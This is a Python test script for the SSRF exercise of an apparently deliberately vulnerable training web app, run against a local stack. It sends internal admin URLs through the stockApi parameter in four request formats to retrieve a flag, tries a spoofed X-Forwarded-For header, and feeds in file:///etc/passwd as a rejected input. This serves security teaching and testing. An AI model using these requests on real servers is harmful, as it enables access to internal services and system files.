"""HTTP checks against the default running Compose stack; no external targets."""
import json
import urllib.error
import urllib.parse
import urllib.request

BASE = 'http://127.0.0.1:8888'
FLAG = 'SVWA{server_side_requests_cross_trust_boundaries}'


def request(path, data=None, content_type=None, status=200):
    headers = {'Content-Type': content_type} if content_type else {}
    try:
        response = urllib.request.urlopen(urllib.request.Request(BASE + path, data, headers), timeout=10)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        assert response.status == status
        if 'stockApi' in path or data:
            assert response.headers.get_content_type() == 'text/plain'
        return response.read().decode()


def fetch(url, status=200):
    return request('/labs/ssrf.php?' + urllib.parse.urlencode({'stockApi': url}), status=status)


assert '/labs/ssrf.php' in request('/')
assert FLAG not in request('/labs/ssrf.php')
for path in ['/internal/stock.php', '/internal/admin.php']:
    try:
        urllib.request.urlopen(urllib.request.Request(BASE + path, headers={'X-Forwarded-For': '127.0.0.1'}))
        raise AssertionError('Internal fixture accessible directly')
    except urllib.error.HTTPError as error:
        assert error.code == 403
assert 'Canvas Backpack: 24 available' in fetch('http://127.0.0.1/internal/stock.php?item=1')
url = 'http://127.0.0.1/internal/admin.php'
assert FLAG in fetch(url)
assert FLAG in request('/labs/ssrf.php', urllib.parse.urlencode({'stockApi': url}).encode(), 'application/x-www-form-urlencoded')
assert FLAG in request('/labs/ssrf.php', json.dumps({'stockApi': url}).encode(), 'application/json')
body = f'--SVWABoundary\r\nContent-Disposition: form-data; name="stockApi"\r\n\r\n{url}\r\n--SVWABoundary--\r\n'.encode()
assert FLAG in request('/labs/ssrf.php', body, 'multipart/form-data; boundary=SVWABoundary')
for url in ['', 'not a URL', 'file:///etc/passwd', 'ftp://127.0.0.1/test']:
    assert 'Enter a valid HTTP or HTTPS URL.' in fetch(url, 400)
assert 'could not be reached' in fetch('http://127.0.0.1:1/', 502)
assert 'Product not found.' in fetch('http://127.0.0.1/internal/stock.php?item=999')
page = fetch('http://127.0.0.1/labs/html.php?search=%3Cb%3Essrf-marker%3C%2Fb%3E')
assert '<b>ssrf-marker</b>' in page
product = request('/labs/ssrf.php')
assert 'id="check-stock"' in product and '<input' not in product
assert '127.0.0.1/internal' not in product
script = request('/assets/ssrf.js')
assert 'stockApi:' in script and 'stockResult.textContent = await response.text()' in script
assert 'Explanation and Fix' in request('/labs/ssrf-explanation.php')
print('SSRF checks passed: discovery, internal boundary, four formats, validation, errors, plain-text responses, product UI.')
